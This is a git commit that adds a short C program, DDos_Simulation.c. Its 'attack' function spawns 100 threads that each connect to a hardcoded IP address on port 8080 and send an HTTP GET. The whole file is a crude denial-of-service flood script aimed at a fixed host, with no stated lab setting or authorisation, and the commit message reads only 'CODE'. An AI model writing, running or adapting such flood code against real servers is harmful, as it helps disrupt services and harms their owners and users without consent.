e4c0785741f17747c0d137955c14f09ac2e1ae2d
dntjddl3547 <dntjddl3547@gmai.com>
2024-11-11 15:15:33 +0900

    CODE

---
+++ code/DDos_Simulation.c
@@ -0,0 +1,54 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+
+#define SERVER_IP "165.132.245.193"
+#define SERVER_PORT 8080
+#define NUM_THREADS 100
+
+void *attack(void *arg) {
+    int sock;
+    struct sockaddr_in server_addr;
+    
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        perror("Socket creation failed");
+        return NULL;
+    }
+    
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(SERVER_PORT);
+    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
+
+    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
+        perror("Connection failed");
+    } else {
+        printf("Connected to server\n");
+    }
+
+    char *message = "GET / HTTP/1.1\r\n\r\n";
+    send(sock, message, strlen(message), 0);
+
+    close(sock);
+    return NULL;
+}
+
+int main(void) {
+    pthread_t threads[NUM_THREADS];
+
+    for (int i = 0; i < NUM_THREADS; i++) {
+        if (pthread_create(&threads[i], NULL, attack, NULL) != 0) {
+            perror("Thread creation failed");
+        }
+        usleep(1000);
+    }
+    
+    for (int i = 0; i < NUM_THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    return 0;
+}
